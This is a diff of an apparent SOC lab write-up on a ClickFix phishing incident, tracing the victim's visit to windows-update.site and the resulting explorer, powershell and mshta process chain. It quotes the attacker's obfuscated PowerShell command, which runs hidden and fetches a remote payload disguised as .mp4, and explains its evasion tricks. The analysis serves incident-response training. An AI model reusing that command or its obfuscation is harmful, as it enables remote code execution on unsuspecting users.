@@ -43,9 +43,11 @@ The email impersonated Microsoft, used a fake countdown timer for urgency, and p
 
 Browser history confirms the visit to `windows-update.site` at 23:26:08.
 
-
-
 <img width="1547" height="714" alt="338-history" src="https://github.com/user-attachments/assets/46830a24-ec85-41dc-b824-423b69ec3920" />
+
+The process logs show Chrome activity at 23:26:08, followed 11 seconds later by `explorer.exe` (PID 6920) launching `powershell.exe` (PID 624). That's the user following the ClickFix steps right after landing on the page.
+
+<img width="544" height="406" alt="SOC-338-secondpage" src="https://github.com/user-attachments/assets/f40432b4-2952-450b-8342-f7762f1d9393" />
 
 At 23:26:19, the user ran the ClickFix command from the Run dialog:
 
@@ -56,9 +58,6 @@ PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoat
 - `-w 1` runs PowerShell with a hidden window.
 - `-replace ']'` strips the brackets, rebuilding `mshta.exe` so the name never appears in plain text (evades simple detection).
 - Everything after `#` is a comment. It's what the user sees at the end of the Run box, making the command look like a CAPTCHA check.
-
-- <img width="544" height="406" alt="SOC-338-secondpage" src="https://github.com/user-attachments/assets/f40432b4-2952-450b-8342-f7762f1d9393" />
-<img width="560" height="447" alt="SOC338-ProcessesView" src="https://github.com/user-attachments/assets/dc098e5e-c703-4a43-b96f-da40394efbdb" />
 
 <img width="767" height="258" alt="SOC-338-captcha" src="https://github.com/user-attachments/assets/ee25935c-cd44-4092-8638-45edab134e0e" />
 
@@ -75,8 +74,12 @@ userinit.exe
             └─ conhost.exe
 ```
 
+<img width="560" height="447" alt="SOC338-ProcessesView" src="https://github.com/user-attachments/assets/dc098e5e-c703-4a43-b96f-da40394efbdb" />
+
 <img width="707" height="167" alt="SOC338-PS624" src="https://github.com/user-attachments/assets/8159e2fb-5375-42c4-b1b2-77b1736d4014" />
+
 <img width="675" height="205" alt="SOC338-PS7308" src="https://github.com/user-attachments/assets/87d18735-339a-422d-b7d3-17eac6aa18ea" />
+
 <img width="525" height="206" alt="SOC338-mshta7284" src="https://github.com/user-attachments/assets/c21e73ce-6369-4f2a-bf73-acfe60bae780" />
 
 `explorer.exe` as the parent of PID 624 confirms the user ran the command manually from the Run dialog. `mshta.exe` is a legitimate Windows binary for running HTML Applications, abused here to execute remote code, and the `.mp4` extension disguises the payload. Its `conhost.exe` child suggests the payload may have started a console process. Later log entries for PIDs 624 and 7308 (23:26:31–32) are repeat events for the same processes, not a second execution. All processes ran as `EC2AMAZ-ILGVOIN\LetsDefend`.
